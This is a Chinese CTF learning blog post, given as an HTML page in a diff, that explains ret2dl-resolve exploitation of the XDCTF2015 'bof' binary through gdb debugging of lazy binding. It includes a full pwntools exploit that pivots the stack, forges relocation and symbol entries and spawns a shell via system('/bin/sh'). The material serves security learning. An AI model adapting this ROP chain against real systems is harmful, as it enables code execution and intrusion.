@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="Chinese">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/2.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/2.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="ret2dl前提 1231、理解ELF2、理解延迟绑定技术3、基本ROP 这里以http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例 查找何处调用write函数 1objdump -d bof|grep write  发现程序只在0x804859a处调用了一次write函数，且write函数在plt表中的地址为0x80483d0。 下面">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN学习之高级ROP">
+<meta property="og:url" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/index.html">
+<meta property="og:site_name" content="KANGEL">
+<meta property="og:description" content="ret2dl前提 1231、理解ELF2、理解延迟绑定技术3、基本ROP 这里以http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例 查找何处调用write函数 1objdump -d bof|grep write  发现程序只在0x804859a处调用了一次write函数，且write函数在plt表中的地址为0x80483d0。 下面">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/2.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/3.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/4.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/5.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/6.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/7.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/8.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/9.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/10.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/11.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/12.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/13.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/14.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/15.JPG">
+<meta property="og:updated_time" content="2019-07-09T07:14:00.808Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWN学习之高级ROP">
+<meta name="twitter:description" content="ret2dl前提 1231、理解ELF2、理解延迟绑定技术3、基本ROP 这里以http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例 查找何处调用write函数 1objdump -d bof|grep write  发现程序只在0x804859a处调用了一次write函数，且write函数在plt表中的地址为0x80483d0。 下面">
+<meta name="twitter:image" content="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/2.JPG">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="KANGEL" type="application/atom+xml"/>
+
+
+
+  
+  
+  <link rel="canonical" href="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PWN学习之高级ROP | KANGEL</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/J-KANGEL" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">KANGEL</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/07/06/PWN学习之高级ROP/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kangel"/>
+      <meta itemprop="description" content="Life is beautiful!"/>
+      <meta itemprop="image" content="/images/0.jpg"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KANGEL"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PWN学习之高级ROP
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-06 08:55:27" itemprop="dateCreated datePublished" datetime="2019-07-06T08:55:27Z">2019-07-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-09 07:14:00" itemprop="dateModified" datetime="2019-07-09T07:14:00Z">2019-07-09</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn学习/" itemprop="url" rel="index"><span itemprop="name">pwn学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="ret2dl"><a href="#ret2dl" class="headerlink" title="ret2dl"></a>ret2dl</h3><p>前提</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、理解ELF</span><br><span class="line">2、理解延迟绑定技术</span><br><span class="line">3、基本ROP</span><br></pre></td></tr></table></figure>
+<p>这里以<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例</a></p>
+<p>查找何处调用write函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bof|grep write</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/06/PWN学习之高级ROP/2.JPG" alt=""></p>
+<p>发现程序只在0x804859a处调用了一次write函数，且write函数在plt表中的地址为0x80483d0。</p>
+<p>下面进行gdb调试</p>
+<p>在0x804859a处下断点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x804859a</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/06/PWN学习之高级ROP/3.JPG" alt=""></p>
+<p>查看plt表中write函数的内容，此时write函数不曾被调用</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/4.JPG" alt=""></p>
+<p>程序跳转到0x804a01c处，查看该地址内容</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/5.JPG" alt=""></p>
+<p>0x804a01c是write函数在plt表中的地址，因为write函数未被调用，所以此时got表中没有存放write函数的真实地址，而是存放write函数在plt表中的下一条地址，执行push 0x20。</p>
+<p>接着程序跳转到0x8048380，这是plt表的入口地址，查看该地址即plt[0]内容</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/6.JPG" alt=""></p>
+<p>程序将0x804a004处的内容入栈，0x0804a004即got[1]，因此该处的内容为link_map。</p>
+<p>程序接着执行0x804a008即got[0]，即调用动态装载器中 _dl_runtime_resolve(link_map,reloc_arg=0x20) 函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x8048380:	push   DWORD PTR ds:0x804a004 ---&gt;0xf7ffd950 ---&gt; link_map	</span><br><span class="line">0x8048386:	jmp    DWORD PTR ds:0x804a008 ---&gt;0xf7fe96c0 ---&gt; _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+<p>下面是_dl_runtime_resolve找到write函数的真实地址并写入got表的过程</p>
+<p>首先通过计算JMPREL[0x20]找到<code>.rel.plt</code>中的write函数，因为JMPREL映射到<code>.rel.plt</code>。查看JMPREL地址</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/7.JPG" alt=""></p>
+<p>JMPREL[0x20] = 0x8048350</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/8.JPG" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset=0x804a01c #即write的got表地址   </span><br><span class="line">r_info=607 #结尾必须是7</span><br></pre></td></tr></table></figure>
+<p>根据r_info找到<code>.dynsym</code>表中的st_name即计算SYMTAB[(r_info&gt;&gt;8)*0x10]，SYMTAB映射到<code>.dynsym</code>,其中0x10为<code>.dynsym</code>每一项的大小。查看SYMTAB的地址</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/9.JPG" alt=""></p>
+<p>SYMTAB[(r_info&gt;&gt;8)*0x10] = 0x8048238</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/10.JPG" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_name=0x4c  #动态符号在 .dynstr 表（动态字符串表）中的偏移</span><br><span class="line">st_shndx=0x12</span><br></pre></td></tr></table></figure>
+<p>根据st_name找到<code>.dynstr</code>表中write符号即计算STRTAB[0x4c]，STRTAB映射到<code>.dynstr</code></p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/11.JPG" alt=""></p>
+<p>STRTAB[0x4c] = 0x80482c4</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/12.JPG" alt=""></p>
+<p>找到write符号，后面就是系统调用的事了。按<code>n</code>继续执行程序，查看got表中的write函数</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/13.JPG" alt=""></p>
+<p>got表中write函数更新为write的真实地址，以上便是<code>延迟绑定技术</code>。</p>
+<p>如果修改<code>.dynstr</code>中write符号所在地址的值，结果又会如何。下面重新运行程序，将<code>write</code>修改为<code>read</code></p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/14.JPG" alt=""></p>
+<p>按<code>n</code>继续执行程序，查看got表中的write函数</p>
+<p><img src="/2019/07/06/PWN学习之高级ROP/15.JPG" alt=""></p>
+<p>成功修改！</p>
+<p>因此我们可以修改<code>.dynstr</code>表来执行我们想要的任意函数，然而<code>.dynstr</code>表不可写。</p>
+<p>加入我们在某一可写地址处写入<code>system</code>，然后伪造<code>.dynsym</code>使STRTAB[st_name]指向<code>system</code>，接着伪造<code>.ret.plt</code>使SYMTAB[r_info&gt;&gt;8 * 0x10]指向伪造的<code>.dynsym</code>，然后想栈顶写入指向伪造<code>.ret.plt</code>的偏移reloc_arg，最后控制eip指向plt[0]，即可执行system函数。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span>   <span class="comment">#控制eip</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only "pop|ret"</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36+align)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp分析：</p>
+<p>首先执行read函数：向base_stage中读入100字节</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：0x08048380</span><br><span class="line">base_stage+8 ：reloc_arg       </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>接着返回到ppp_ret，pop掉三个参数，返回ebp_pop，将base_stage传入ebp，接着返回leave，将ebp中的base_stage传入esp。此时esp指向base_stage，然后pop ebp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：0x08048380  &lt;-esp</span><br><span class="line">base_stage+8 ：reloc_arg </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>返回plt_0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：0x08048380  </span><br><span class="line">base_stage+8 ：reloc_arg   &lt;-esp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>plt_0将link_map入栈</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_stage   ：&apos;AAAA&apos;</span><br><span class="line">base_stage+4 ：link_map  &lt;-esp</span><br><span class="line">base_stage+8 ：reloc_arg </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>接着调用_dl_runtime_solve()函数，执行system(‘/bin/sh’)。</p>
+<p>参考链接：</p>
+<p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/</a></p>
+<p><a href="https://www.anquanke.com/post/id/177450" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177450</a></p>
+
+      
+    </div>
+
+    
+    
+    <div>
+    
+    <div> 
+ 
+<div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div> 
+
+ </div>
+
+    
+    </div>
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i>pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/05/利用readelf详解elf/" rel="next" title="利用readelf详解elf">
+                <i class="fa fa-chevron-left"></i> 利用readelf详解elf
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/25/cybrics/" rel="prev" title="cybrics CTF 2019 writeup">
+                cybrics CTF 2019 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/0.jpg"
+                alt="kangel"/>
+            
+              <p class="site-author-name" itemprop="name">kangel</p>
+              <div class="site-description motion-element" itemprop="description">Life is beautiful!</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2dl"><span class="nav-number">1.</span> <span class="nav-text">ret2dl</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
